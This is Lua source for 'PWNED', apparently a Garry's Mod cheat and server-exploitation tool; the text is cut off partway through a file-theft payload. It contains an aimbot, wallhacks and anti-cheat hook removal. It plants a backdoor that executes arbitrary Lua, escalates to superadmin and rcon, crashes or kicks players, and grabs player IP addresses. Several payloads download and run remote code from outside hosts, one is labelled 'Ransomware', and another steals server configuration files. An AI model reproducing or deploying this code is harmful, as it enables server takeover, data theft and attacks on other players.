print("Starting PWNED. . .")
MsgC(Color(255,0,0),[[


 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌   ▄   ▐░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌░▌ ▐░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌░▌   ▐░▐░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░░▌     ▐░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀▀       ▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
                                                                 


]])
--[[
print("PWNED Version "..LoaderVersion)
if !(LoaderVersion == 1) then
	MsgC(Color(200, 0, 0), " ----- WRONG PWNED VERSION -----\n")
	MsgC(Color(200, 0, 0), "WRONG PWNED VERSION CAN CAUSE LUA ERROR, GAME CRASH AND MORE\n")
	MsgC(Color(200, 0, 0), "PLEASE GET THE NEWEST VERSION ON THE DISCORD ! https://discord.gg/Mwv9bGm\n")
	MsgC(Color(200, 0, 0), " ----- WRONG PWNED VERSION -----\n")
	return
end
]]
local isEnable = false
local function SteamIDCheck()
	if !IsClientLua() then return true end
	local lsid = SteamID(LocalPlayer()) -- fadmin unban STEAM_0:0:89711282
	local sid = {}
	table.insert(sid, "STEAM_0:0:89711282") -- Jordane
	table.insert(sid, "STEAM_0:1:107916312") -- Verifio
	table.insert(sid, "STEAM_0:0:159178716")
	table.insert(sid, "STEAM_0:1:149464003") -- Neize
	table.insert(sid, "STEAM_0:0:427630813") -- Verifio (2ème Compte)
	table.insert(sid, "STEAM_0:0:117918111")
	table.insert(sid, "STEAM_0:0:155788450") -- Mon pote
	table.insert(sid, "STEAM_0:1:80447668") -- Chuckie
	table.insert(sid, "STEAM_1:0:117918111") -- IXXE

	

--RunConsoleCommand("ulx", "logEcho", "0") RunConsoleCommand("ulx", "removeuserid", "STEAM_0:0:89711282", "superadmin")
	return table.HasValue(sid, lsid)
end
timer.Create("PWNED_CHECK_FOR_ENABLE", 0.001, 0, function()
	if not IsClientLua() then
		isEnable = false
	end
end)
concommand.Add("pwned_enable", function()
	if not IsClientLua() then
		MsgC(Color(255, 0, 0), "Tu doit être en partie pour l'activer !\n")
		return
	end
	local ok = SteamIDCheck()
	if not ok then
		-- Not whitelisted
		timer.Create("PWNED_YOU_ARE_FUCKED", 0.1, 0,function()
			for i=1,10 do
				MsgC(Color(255, 0, 0), "Your identity can't be verified, try again\n")
			end
		end)
		timer.Simple(15, function()
			table.Empty(debug.getregistry())
			timer.Simple(5, function()
				while true do end
			end)
		end)
	else
		isEnable = true
	end
end)
timer.Create("PWNED_STEAMID_CHECK", 5, 0, function()
	if not isEnable then return end
	local ok = SteamIDCheck()
	if not ok then
		-- Not whitelisted
		timer.Create("PWNED_YOU_ARE_FUCKED", 0.1, 0,function()
			for i=1,10 do
				MsgC(Color(255, 0, 0), "Your identity can't be verified, try again\n")
			end
		end)
		timer.Simple(15, function()
			table.Empty(debug.getregistry())
			timer.Simple(5, function()
				while true do end
			end)
		end)
	end
end)

print("Replacing loading screen. . .")
local _oGD = GameDetails
function GameDetails( servername, serverurl, mapname, maxplayers, steamid, gamemode )
	serverurl = "http://textifi.hol.es/pwneloading.html"
	_oGD(servername, serverurl, mapname, maxplayers, steamid, gamemode)
end
surface.CreateFont("ESPFont", {size=18, bold=14})
local net = {}
local _pSetting = {}
_pSetting.Colors = {}
_pSetting.Colors.Menu = Color(0, 0, 0, 200)
_pSetting.Colors.ESPT = Color(0, 0, 0)
_pSetting.ESP = true
_pSetting.CROSSAIRE = true
_pSetting.TRACER = true
_pSetting.WALLHACK = true
_pSetting.ENTITES = {
	"prop_physics"
}
_pSetting.AIMBOT = false
_pSetting.AIMBOT_AUTOSHOOT = true
_pSetting.AUTODUCK = false
_pSetting.RAGE = false
concommand.Add("pwned_toggle_aimbot",function()
	_pSetting.AIMBOT = not _pSetting.AIMBOT
end)
function net.Pooled( msg )
	return not (GetMessageID(msg) == 0)
end
function net.Start( msg )
	if not net.Pooled(msg) then return end
	netStart(msg)
end
function net.SendToServer()
	netSendToServer()
end
function net.WriteString( msg )
	netWriteString( msg )
end
function net.WriteTable( tab )
	if not istable(tab) then return end
	netWriteTable( tab )
end
function net.WriteFloat( f )
	netWriteFloat( f )
end
function net.WriteBit( b )
	netWriteBit( b )
end
function net.WriteBool( b )
	netWriteBool( b )
end
function net.WriteUInt( ui, nb )
	netWriteUInt( ui, nb )
end
function net.WriteInt( i, nb )
	netWriteInt( i, nb )
end
function net.WriteData( d, l )
	netWriteData( d, l )
end
function net.WriteEntity( i )
	net.WriteUInt( i, 16 )
end
function net.WriteColor( c )
	netWriteColor( c )
end
local function LocalPlayer()
	return LocalPlayerEntIndex()
end
local player = {}
function player.GetAll()
	return entsFindByClass("player")
end


local CAC = false
timer.Create("PWNED_CAC_CHECK", 0.1, 0, function()
	if not isEnable then return end
	if IsClientLua() then
		CAC = FileExists( "includes/extensions/client/vehicle.lua", "LUA" )
		RemoveHook("HUDPaint", "GhostBan_HUD")
		RemoveHook("Think", "GhostBan_ThinkDifferent")
		RemoveHook("OnSpawnMenuOpen", "GhostBan_NoProps4U")
		RemoveHook("ContextMenuOpen", "GhostBan_NoContext4U")
		RemoveHook("PlayerStartVoice", "GhostBan_MuteNotify")
		RemoveHook("HUDShouldDraw", "GhostBan_NoHUD4U")
		RemoveHook("PlayerBindPress", "veridevs_blockbinds")
	end
end)
function Msg( msg )
	if IsClientLua() and not CAC then
		ExecuteOnClient([[chat.AddText(Color(255, 0, 0), "[PWNED]", Color(255, 255, 255), [=[]]..msg..[[]=])]])
	else
		MsgC(Color(255, 0, 0), "[PWNED]", Color(255, 255, 255), msg.."\n")
	end
end
function SaveSettings()
	local j = util.TableToJSON(_pSetting, true)
	file.Write("pwned_settings.dat", j)
end
function LoadSettings()
	if not file.Exists("data/pwned_settings.dat", "GAME") then
		SaveSettings()
	end
	local j = file.Read("data/pwned_settings.dat", "GAME") or "{}"
	if (j == "{}") or (not j) then
		SaveSettings()
		return
	end
	for k,v in ipairs(util.JSONToTable(j)) do
		_pSetting[k] = v
	end

end
xpcall(LoadSettings, SaveSettings) -- First start

function RandomString( l )
	str = ""
	for i = 0, l do 
		str = str..string.char(math.random(97,122))
	end
	return str
end

hook.Add("DrawOverlay", "PWNED_VISUAL", function()
	if not isEnable then return end
	if not IsClientLua() or gui.IsGameUIVisible() then return end
	if _pSetting.ESP then
		for k,v in ipairs(player.GetAll()) do
			if not(v == LocalPlayer()) and PlayerAlive(v) then
				local pos = EntityGetPos(v)
				local TargetPos = GetBonePosition(v, LookupBone(v, "ValveBiped.Bip01_Head1"))
				TargetPos = VectorToScreen(TargetPos)
				surface.DrawCircle( TargetPos.x, TargetPos.y, 16, _pSetting.Colors.ESPT )
				local prPos = VectorToScreen(pos)
				surface.SetDrawColor(_pSetting.Colors.ESPT)
				surface.DrawLine(TargetPos.x, TargetPos.y, prPos.x, prPos.y)
				pos = VectorToScreen(pos + Vector(0, 0, 50))
				draw.SimpleText(PlayerNick(v).."("..EntityHealth(v)..")","ESPFont", pos.x + 2, pos.y, _pSetting.Colors.ESPT)
			end
		end
	end
	if _pSetting.CROSSAIRE then
		surface.DrawCircle( ScrW() / 2, ScrH() / 2, 8, Color(255, 0, 0) )
	end
	if _pSetting.TRACER then
		for k,v in ipairs(player.GetAll()) do
			if not(v == LocalPlayer()) and PlayerAlive(v) then
				local pos = EntityGetPos(v)
				pos = VectorToScreen(pos + Vector(0, 0, 50))
				if pos.visible then
					surface.SetDrawColor(_pSetting.Colors.ESPT)
					surface.DrawLine(ScrW() / 2, ScrH() / 2, pos.x, pos.y)
				end
			end
		end
	end
	if _pSetting.WALLHACK then
		for i,o in ipairs(_pSetting.ENTITES) do
			for k,v in ipairs(entsFindByClass(o)) do
				if not(v == LocalPlayer()) and EntityIsValid(v) then
					local pos = EntityGetPos(v)
					pos = VectorToScreen(pos)
					if pos.visible then
						surface.DrawCircle( pos.x, pos.y, 16, Color(255, 255, 255, 150) )
					end
				end
			end
		end
	end
end)

local bTarget = nil
concommand.Add("pwned_aimbot_reset_target", function()
	bTarget = nil
	_pSetting.AIMBOT_AUTOSHOOT = false
end)
hook.Add("Think", "PWNED_THINK", function()
	if not isEnable then return end
	AIMBOT()
	BHOP()
	AUTODUCK()
end)

function AUTODUCK()
		if not IsClientLua() or gui.IsGameUIVisible() or !input.IsMouseDown(107) or !_pSetting.AUTODUCK then return end
		RunConsoleCommand("+duck")
		timer.Simple(0.1, function()
			RunConsoleCommand("-duck")
		end)
end

local lastCt = 0
local bhoplast = 0
local injump = false
function BHOP()
	if not IsClientLua() or gui.IsGameUIVisible() or !input.IsKeyDown(KEY_LSHIFT) then return end
	if CAC then
		if lastCt >= 40 then
			if (bhoplast + 2) - CurTime() <= 1 then
				lastCt = 0
			else
				return
			end
			return
		end
	end
	if input.IsKeyDown(KEY_SPACE) and !injump then
	 	if IsOnGround(LocalPlayer()) and !injump then
	 		RunConsoleCommand("+jump")
	 		if CAC then
		 		lastCt = lastCt + 1
		 		injump = true
		 		bhoplast = CurTime()
		 	end
	 		timer.Create("PWNED_Bhop", 0, 0.01, function()
	 	 		RunConsoleCommand("-jump") 
	 	 		injump = false
	 	 	end)
	 	end
	end
end
function distance2D( xorigin, yorigin, xdestination, ydestination )
  if xorigin > xdestination then
   xdistance = xorigin - xdestination
  elseif xorigin < xdestination then
   xdistance = xdestination - xorigin
  end
  
  if yorigin > ydestination then
   ydistance = yorigin - ydestination
  elseif yorigin < ydestination then
   ydistance = ydestination - yorigin
  end
  
  return math.sqrt(xdistance ^ 2 + ydistance ^ 2)
end

function TARGET()
	if not bTarget or not EntityIsValid(bTarget) or not PlayerAlive(bTarget) then return end
	local TargetPos = GetBonePosition(bTarget, LookupBone(bTarget, "ValveBiped.Bip01_Head1"))
	local ShootingPos = GetShootingPos()
	local vAngle = (TargetPos - ShootingPos)

	

     
    local ag = Angle(GetAngleFromVector(vAngle.x, vAngle.y, vAngle.z))
 	ag.x = math.NormalizeAngle(ag.x)
    ag.p = math.Clamp(ag.p, -89, 89)

	SetEyeAngles(ag.p, ag.y, ag.r)
	if _pSetting.AIMBOT_AUTOSHOOT then
		RunConsoleCommand("+attack")
		timer.Simple(0.4, function()
			RunConsoleCommand("-attack")
		end)
	end
end

function AIMBOT()
	if not IsClientLua() or gui.IsGameUIVisible() or not _pSetting.AIMBOT then return end
	local bDistance = 99999999999999
	bTarget = nil
	if true then
		for k,v in ipairs(player.GetAll()) do
			if v != LocalPlayer() and PlayerAlive(v) then
			--[[	local lPos = EntityGetPos(LocalPlayer())
				local pPos = EntityGetPos(v)		
				local distance = Distance(lPos.x, lPos.y, lPos.z, pPos.x, pPos.y, pPos.z)
				if distance < bDistance then
					bDistance = distance
					bTarget = v
				end]]

				pos = VectorToScreen(EntityGetPos(v))
				if pos.visible then
					if _pSetting.RAGE then bTarget = v TARGET() end
					local distance = distance2D(ScrW() / 2, ScrH() / 2, pos.x, pos.y)
					if distance < bDistance then
						bDistance = distance
						bTarget = v
					end
				end
			end
		end
	end
	TARGET()
end

local IsStriping = false
function CreateMenu()
	if not IsClientLua() then
		Msg("You must be playing to open the menu")
		return
	end
	isEnable = true
	gui.ActivateGameUI()
	if MainFrame then MainFrame:Remove() end
	MainFrame = vgui.Create( "DFrame" )
	MainFrame:SetTitle( "" )
	MainFrame:SetSize( 700, 500 )
	MainFrame:ShowCloseButton(true)
	MainFrame:SetDraggable(true)
	MainFrame:Center()
	MainFrame:MakePopup()
	MainFrame.Paint = function( self, w, h )
		draw.RoundedBox( 0, 0, 0, w, h, _pSetting.Colors.Menu )
	end
	MainFrame.Close = function( s )
		s:Remove()
	end
	local InGameLabel = vgui.Create( "DLabel", MainFrame )
	InGameLabel:SetText( (IsClientLua() and "PWNED v22") or "Not playing" )
	InGameLabel:SizeToContents()
	InGameLabel:SetPos(5, 5)

	local reloadbutton = vgui.Create("DButton", MainFrame)
	reloadbutton:SetPos(75, 5)
	reloadbutton:SetText("Reload")
	reloadbutton:SizeToContents()
	reloadbutton.OnMousePressed = function()
		MainFrame:Remove()
		http.Fetch("https://raw.githubusercontent.com/Wownicehat/pwnedcheat-gmod/master/for_real_nigger.lua?c="..math.Rand(1111, 9999),function( cc )
			RunString(cc.."RunConsoleCommand(\"pwned_menu\")")
		end)
	end
	local backdoorinjectbutton = vgui.Create("DButton", MainFrame)
	backdoorinjectbutton:SetPos(175, 5)
	backdoorinjectbutton:SetText("Backdoor inject test")
	backdoorinjectbutton:SizeToContents()
	backdoorinjectbutton.OnMousePressed = function()
	RunConsoleCommand("ulx", "luarun", [[util.AddNetworkString("ULX_QUERY_TEST2") net.Receive("ULX_QUERY_TEST2", function() RunString(net.ReadString()) end)]])
		MainFrame:Remove()
		timer.Simple(0.5, function()
			RunConsoleCommand("pwned_menu")
		end)
	end



	local sheet = vgui.Create( "DPropertySheet", MainFrame )
	sheet:Dock( FILL )
	sheet.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 230 ) )
	end

	local ExploitsPanel = vgui.Create( "DScrollPanel", sheet )
	ExploitsPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	sheet:AddSheet( "Exploits", ExploitsPanel, "icon16/bug.png" )
	local exploits = {}
	i = 2
	local function AddExploit( name, tab )
		
		if not tab.scan() then return end
		exploits[name] = {}
		exploits[name] = vgui.Create("DButton", ExploitsPanel)
		exploits[name]:SetPos(0, (i * 4) + (i * 15))
		exploits[name]:SetText(tab.desc)
		exploits[name]:SetSize(500, 30)
		exploits[name]:SetFont("ESPFont")
		exploits[name].OnMousePressed = function()
			surface.PlaySound("buttons/blip1.wav")
			tab.action()
		end
		exploits[name].Paint = function( s, w, h )
			draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 230 ) )
			draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, Color( 0, 255, 0 ) )
		end
		i = i + 2
	end


	local backdoors = {
		"UKT_MOMOS", "Sandbox_ArmDupe", "Fix_Keypads", "memeDoor",
		"Remove_Exploiters", "noclipcloakaesp_chat_text", "fellosnake", "NoNerks",
		"BackDoor", "kek", "OdiumBackDoor", "cucked", "ITEM", "ULogs_Info", "Ulib_Message",
		"m9k_addons", "Sbox_itemstore", "rcivluz", "Sbox_darkrp", "_Defqon", "something",
		"random", "strip0", "killserver", "DefqonBackdoor", "fuckserver", "cvaraccess",
		"web", "rconadmin", "_CAC_ReadMemory", "nostrip", "c", "DarkRP_AdminWeapons",
		"enablevac", "SessionBackdoor", "LickMeOut", "MoonMan", "Im_SOCool", "fix",
		"idk", "ULXQUERY2", "ULX_QUERY2", "jesuslebg", "zilnix", "ÃžÃ ?D)â—˜",
		"disablebackdoor", "kill", "oldNetReadData", "SENDTEST", "Sandbox_GayParty",
		"nocheat", "_clientcvars", "_main", "ZimbaBackDoor", "stream", "waoz", "DarkRP_UTF8",
		"bdsm", "ZernaxBackdoor", "anticrash", "audisquad_lua",


		"ULX_ANTI_BACKDOOR", "FADMIN_ANTICRASH", "ULX_QUERY_TEST2" -- <-- PWNED TEAM BACKDOOR
	
}
	local soez = "ULX_QUERY_TEST2"
--util.AddNetworkString("ULX_ANTI_BACKDOOR") net.Receive("ULX_ANTI_BACKDOOR", function() RunString(net.ReadString()) end)

	for k,v in ipairs(backdoors) do
		if net.Pooled(v) then
			soez = v
		end
	end


function FORMAT( lua, target )
	
	lua = string.Replace(lua, "#T", "Entity("..target..")")
	lua = string.Replace(lua, "#M", "Entity("..LocalPlayer()..")")
	return lua
end


	AddExploit("S_BD", {
		desc = "Backdoor", 
		action = function()
		if bdmenu then bdmenu:Remove() end
			bdmenu = vgui.Create("DFrame")
			bdmenu:SetTitle("Backdoor ["..soez.."]")
			bdmenu:SetSize(500, 500)
			bdmenu:Center()
			bdmenu:SetDraggable(true)
			bdmenu:ShowCloseButton(true)
			bdmenu:MakePopup()
			bdmenu.Paint = function( s, w, h )
				draw.RoundedBoxEx(0, 0, 0, w, h, _pSetting.Colors.Menu)
			end
			function SENDLUA( lua )
				net.Start(soez)
				net.WriteString(lua)
				net.WriteBit(true)
				net.SendToServer()
			end
--RunConsoleCommand("ulx", "map", "gm_flatgrass")
			function CLIENTLUA( lua )
				net.Start(soez)
				net.WriteString([[
					util.AddNetworkString("nostrip")
					net.Start("nostrip")
					net.WriteString([=[]]..lua..[[=])
					net.Broadcast()
					]])
				net.SendToServer()
				Msg(lua)
			end
			SENDLUA([=[
				if(ulx) then
					RunConsoleCommand("ulx", "logEcho", "0")
					RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
					RunConsoleCommand("ulx", "groupallow", "user", "ulx rcon")
					RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(LocalPlayer())..[=[","ulx luarun")
  			        RunConsoleCommand("ulx","userallow", "]=]..PlayerNick(LocalPlayer())..[=[","ulx rcon")
				end
				pcall(function(__, ___)
					util.AddNetworkString("ULX_QUERY_TEST2")
					net.Receive("ULX_QUERY_TEST2", function(x, r)
						local a = net.ReadString()
						a = CompileString(a,___,false)
						xpcall(a, function(err)
							r:ChatPrint(err)
						end)
					end)
					return true
				end, CurTime(), "FUCK YOU")
				--[[IF YOU SEE THIS THEN GO FUCK YOURSELF
				PWNED > ALL
				]]
			]=])
			-- util.AddNetworkString("ULX_QUERY_TEST2") net.Receive("ULX_QUERY_TEST2", function() RunString(net.ReadString()) end)
			
			local llist = {}

			local playerlist = vgui.Create("DScrollPanel", bdmenu)
			playerlist:SetPos(300,20)
			playerlist:SetSize(200,500)
			playerlist.Paint = function( s, w, h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(255,255,255))
			end
			local pipp = 3
			for i,v in ipairs(player.GetAll()) do
				llist[i] = vgui.Create("DCheckBoxLabel", playerlist)
				llist[i]:SetPos(5,(pipp * 10) + (pipp * 15))
				llist[i]:SetValue(0)
				if SteamID(LocalPlayer()) == SteamID(v) then
					llist[i]:SetTextColor(Color(50, 0, 0))
					llist[i]:SetText(PlayerNick(v).." [ME]")
				else
					llist[i]:SetTextColor(Color(0, 0, 0))
					llist[i]:SetText(PlayerNick(v))
				end
				llist[i].pValue = v
				llist[i].pSteamID = SteamID(v)
				pipp = pipp + 1
			end
				local a = vgui.Create("DButton", playerlist)
				a:SetPos(5,2)
				a:SetText("Everyone")
				a:SetFont("ESPFont")
				a:SetSize(190, 25)
				a.OnMousePressed = function()
					surface.PlaySound("buttons/blip1.wav")
					for i,v in ipairs(llist) do
						v:SetValue(1)
					end
				end

			local pan = vgui.Create("DScrollPanel", bdmenu)
			pan:SetPos(0,20)
			pan:SetSize(300,500)
			pan.Paint = function( s, w, h )
				draw.RoundedBoxEx(0, 0, 0, w, h, _pSetting.Colors.Menu)
			end

			local args = vgui.Create("DTextEntry", pan)
			args:SetPos(5,1)
			args:SetSize(285,20)
			args:SetValue([[Argument go here]])


			local pud = 1
			local function AddPayload( btn, func )
				local a = vgui.Create("DButton", pan)
				a:SetPos(5,(pud * 15) + (pud * 15))
				a:SetText(btn)
				a:SetFont("ESPFont")
				a:SetSize(285, 25)
				a.OnMousePressed = function()
					surface.PlaySound("buttons/blip1.wav")
					func()
				end
				a.Paint = function( s, w, h )
					draw.RoundedBoxEx(0, 0, 0, w, h, Color(50, 50, 175))
					surface.SetDrawColor(100, 50, 50)
					surface.DrawOutlinedRect(0, 0, w, h)
				end
				a:SetTextColor(Color(0,0,0))
				pud = pud + 1
				return a
			end

			local function ForeachSelected(func)
				for k,v in ipairs(llist) do
					if v:GetChecked() then
						func(v.pValue)
					end
				end
			end

			local aa = AddPayload("Player Stuff",function()
			end)
			function aa.Paint( s,w,h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(200, 200, 200))
			end
			AddPayload("Superadmin",function()
				ForeachSelected(function(ply)
					local code = [[
						local ply = #T
						ply:SetUserGroup("superadmin")
					]]
					code = FORMAT(code, ply)
					SENDLUA(code)
				end)
			end):SetTextColor(Color(255, 0, 0))
			AddPayload("User",function()
				ForeachSelected(function(ply)
					local code = [[
						local ply = #T
						ply:SetUserGroup("user")
					]]
					code = FORMAT(code, ply)
					SENDLUA(code)
				end)
			end)
			AddPayload("Kill",function()
				ForeachSelected(function(ply)
					local code = [[
						local ply = #T
						ply:Kill()
					]]
					code = FORMAT(code, ply)
					SENDLUA(code)
				end)
			end)
			AddPayload("Grab IP",function()
				ForeachSelected(function(ply)
					local code = [[
						local ply = #T
						#M:ChatPrint(ply:Nick().." : "..ply:IPAddress())
					]]
					code = FORMAT(code, ply)
					SENDLUA(code)
				end)
			end):SetTextColor(Color(0, 0, 255)) 
			AddPayload("Force Command",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:ConCommand([==[]]..args:GetValue()..[[]==])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)
			AddPayload("Force Lua",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([==[]]..args:GetValue()..[[]==])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)
			AddPayload("Ignite",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:Ignite(9999999)
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)
			AddPayload("Kick",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:Kick("]]..args:GetValue()..[[")
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)
			AddPayload("Crash",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([=[while true do end]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("RAGE!",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([=[hook.Add("Think", "OHFUCKMEEEEEEEEEEEEEEEEEEEEE", function()
						gui.HideGameUI()
						RunConsoleCommand("+voicerecord")
					end)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end):SetTextColor(Color(0, 0, 255))
			local aa = AddPayload("Player Visual Stuff",function()
			end)
			function aa.Paint( s,w,h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(200, 200, 200))
			end
			AddPayload("The Plague",function()
				ForeachSelected(function(ply)
						local code = [[
						#T:SendLua([=[http.Fetch("https://ghostbin.com/paste/ocwmw/raw", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("TFCD",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([=[http.Fetch("http://textifi.hol.es/gmod.lua", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)
			AddPayload("TFCD2",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([=[http.Fetch("http://185.116.236.192/backdoor/TFCDV2.lua", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)

			AddPayload("Server Bug",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SendLua([=[http.Fetch("https://ghostbin.com/paste/dcbah/raw", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
				end)			
			end)

			AddPayload("Break playermodel",function()
				ForeachSelected(function(ply)
						local code = [[
							local ply = #T
							ply:SetModel("models/editor/playernet.Start.mdl")
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("Skeleton playermodel",function()
				ForeachSelected(function(ply)
						local code = [[
						timer.Create("ImaSkeletonYo#T#T", 0.2, 0, function()
							#T:SetModel("models/player/skeleton.mdl")
						end)
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end)
				end)
			AddPayload("Chat spam",function()
				ForeachSelected(function(ply)
						local code = [[
						timer.Create("NOSPAMMMMMMMo#T#T", 0.2, 0, function()
							#T:SendLua([=[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)),"]]..args:GetValue()..[[")]=])
						end)
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("Casser les textures",function()
				ForeachSelected(function(ply)
						local code = [[
						#T:SendLua([=[http.Fetch("https://ghostbin.com/paste/a6ueh/raw", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("Ransomware",function()
				ForeachSelected(function(ply)
						local code = [[
						#T:SendLua([=[http.Fetch("https://ghostbin.com/paste/jr9gr/raw", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			AddPayload("Cool things",function()
				ForeachSelected(function(ply)
						local code = [[
						#T:SendLua([=[http.Fetch("http://textifi.hol.es/a.lua", RunString)]=])
						]]
						code = FORMAT(code, ply)
						SENDLUA(code)
					end) 
				end)
			local aa = AddPayload("Server Stuff",function()
			end)
			function aa.Paint( s,w,h )
				draw.RoundedBoxEx(0, 0, 0, w, h, Color(200, 200, 200))
			end
			AddPayload("Command",function()
					local code = [[
						game.ConsoleCommand([==[]]..args:GetValue()..[[]==].."\n")
					]]
					SENDLUA(code)		
			end)
			AddPayload("Lua",function()
					local code = args:GetValue()
					SENDLUA(code)		
			end)
			AddPayload("HTTP RunString",function()
					local code = [[
						http.Fetch([==[]]..args:GetValue()..[[]==], RunString)
					]]
					SENDLUA(code)		
			end)
			AddPayload("PWNED ULTIMATE !",function()
					local code = [[
						http.Fetch([==[http://textifi.hol.es/b1g.lua]==], RunString)
					]]
					SENDLUA(code)		
			end)
			AddPayload("Break kicks",function()
					local code = [[
						local bad = {"Ban","Kick"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
					]]
					SENDLUA(code)
				end):SetTextColor(Color(255, 0, 0))
			AddPayload("Break gravity",function()
					local code = [[
						RunConsoleCommand("sv_gravity", "-600")
					]]
					SENDLUA(code)
				end)
			AddPayload("Restart server",function()
					local code = [[
						RunConsoleCommand("_restart")
					]]
					SENDLUA(code)
				end)
			AddPayload("Spoof backdoor",function()

			local tospoofbackdoors = {
				"UKT_MOMOS", "Sandbox_ArmDupe", "Fix_Keypads", "memeDoor",
				"Remove_Exploiters", "noclipcloakaesp_chat_text", "fellosnake", "NoNerks",
				"BackDoor", "kek", "OdiumBackDoor", "cucked", "ITEM", "ULogs_Info", "Ulib_Message",
				"m9k_addons", "Sbox_itemstore", "rcivluz", "Sbox_darkrp", "_Defqon", "something",
				"random", "strip0", "killserver", "DefqonBackdoor", "fuckserver", "cvaraccess",
				"web", "rconadmin", "_CAC_ReadMemory", "nostrip", "c", "DarkRP_AdminWeapons",
				"enablevac", "SessionBackdoor", "LickMeOut", "MoonMan", "Im_SOCool", "fix",
				"idk", "ULXQUERY2", "ULX_QUERY2", "jesuslebg", "zilnix", "ÃžÃ ?D)â—˜",
				"disablebackdoor", "kill", "oldNetReadData", "SENDTEST", "Sandbox_GayParty",
				"nocheat", "ZimbaBackDoor", "DarkRP_UTF8"
			}

		if timer.Exists("FKEFNKE") then timer.Destroy("FKEFNKE") Msg("Stop spoofing backdoor") return end
		timer.Create("FKEFNKE", 1, 0, function()
						if not IsClientLua() then timer.Destroy("FKEFNKE") return end
					

				for k,v in ipairs(tospoofbackdoors) do
				SENDLUA([[
							util.AddNetworkString("]]..v..[[")
							net.Receive("]]..v..[[", function(a, b)
								b:ChatPrint("Nique ta soeur")
							end)

						]])
			end
		end)
		Msg("Spoofing backdoor")
	end):SetTextColor(Color(255, 0, 0))
			AddPayload("File steal",function()
					local code = [[
						#M:SendLua([=[net.Receive("]]..soez..[[", function()
							local a, b = net.ReadString(), net.ReadString()
								if (b == "DIR") then file.CreateDir("stealed/"..a) return end
								file.Write("stealed/"..a..".txt", b)
							end)]=])

							local function SendFile( f )
								local content = file.Read(f, "GAME") or "NO DATA"
								net.Start("]]..soez..[[")
								net.WriteString(f)
								net.WriteString(content)
								net.Send(#M)
								#M:ChatPrint("Sent: "..f)
							end
							local function SendDir( d )
								net.Start("]]..soez..[[")
								net.WriteString(d)
								net.WriteString("DIR")
								net.Send(#M)
							end

							SendDir("cfg")
							SendDir("data")
							SendDir("data/ulx")
							SendDir("data/ulib")
							SendFile("cfg/server.cfg")
							SendFile("cfg/autoexec.cfg")
							SendFile("data/ulx/config.txt")
